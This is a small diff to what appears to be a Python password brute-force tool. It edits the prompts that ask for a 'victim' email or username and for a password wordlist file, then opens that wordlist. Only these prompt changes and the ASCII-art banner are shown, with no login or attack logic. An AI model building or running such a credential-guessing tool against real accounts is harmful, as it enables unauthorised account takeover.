@@ -70,10 +70,10 @@ print('''              ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇
               ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇
                                 ''')
 
-email=input      ('Enter Email of victim : ')
+email=input      ('Enter Email or username of victim : ')
 print("")
 
-passlist = input ("Enter password file   : ")
+passlist = input ("Enter password file with 'txt'  : ")
 print ("")
 file=open(passlist,'r')
 
